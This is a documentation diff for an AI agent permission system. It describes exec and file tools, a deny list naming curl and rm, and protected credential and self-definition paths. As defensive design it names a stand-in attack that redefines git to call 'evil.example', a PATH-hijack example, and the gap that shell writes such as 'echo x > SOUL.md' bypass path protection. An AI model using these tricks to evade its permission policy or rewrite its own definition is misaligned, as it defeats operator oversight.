@@ -310,6 +310,10 @@ tools:
     deny:  ["exec(rm *)", "exec(curl *)"]
 ```
 
+Six tools: `exec`, `file_read`, `file_write`, `file_edit`, `glob`, `grep`. Pin only what the agent
+needs — `file_read`, `glob`, `grep` is a complete read-only set, and `castellan init --system read`
+generates exactly that.
+
 `exec` takes `command`, `workdir`, `timeoutMs`, `pty`, and `background`. It takes **no `env`
 argument**, deliberately: a per-call environment map is invisible to the policy engine, which matches
 the command string, so `{PATH: "/tmp/evil"}` beside `git status` would pass a rule that never saw the
@@ -322,6 +326,36 @@ A persistent shell would let one tainted call define `git() { curl evil.example 
 `exec(git status:*)` rule into an authorization for attacker code — CVE-2026-32009's shape from
 inside the session. The directory is the exception because losing it is a correctness problem, not a
 security one, and small models do not reliably re-derive a `cd`.
+
+**The file tools exist so that permissions can work.** A `file_write` call carries a `path` a rule can
+match exactly and the protected set can refuse; `echo x > "$F"` carries the same target inside a string
+nothing can inspect. Their descriptions route the model away from the shell for that reason, and it is
+a security control rather than a style note. A relative path resolves against the shell session's
+working directory — the one `exec`'s `cd` moves — so `cd ~/project` then `file_read package.json`
+behaves the way a person means it.
+
+`file_edit` matches an exact unique string, never a line number, and **two matches is a failure**:
+picking one would be a coin toss that reports success while editing the wrong line. Nothing is written
+on either failure path.
+
+### Protected paths
+
+Not writable by the file tools, and **no `policy.allow` rule reaches past them**:
+
+| | |
+| --- | --- |
+| the agent's own definition | `agent.yaml`, `SOUL.md`, `SOUL.compact.md`, `AGENTS.md`, `POLICY.md`, `REMINDER.md` |
+| runtime state | any dot-directory under the agent's own directory |
+| credentials, anywhere on disk | `.ssh/`, `.aws/`, `.kube/`, `.gnupg/`, `.docker/`, `.env*`, `.netrc`, `.npmrc`, `*.pem`, `*.key` |
+
+Elsewhere this protects config. Here the workspace files **are the agent**, and a rule authorising a
+write to them would be a rule authorising its own replacement. `USER.md` and `MEMORY.md` stay writable
+— they are the volatile tier `memory_write` exists for. `tools.providerConfig.protect` adds patterns;
+nothing removes any, because the set contains the policy file.
+
+**Stated rather than discovered: this binds the file tools and not `exec`.** `echo x > SOUL.md` carries
+its target inside a shell string where no path check can see it. Pinning `exec` grants more than this
+protects.
 
 Not a sandbox. A policy decides *whether* a command runs; a sandbox decides *where*. This ships the
 first, and containment stays a deployment concern.
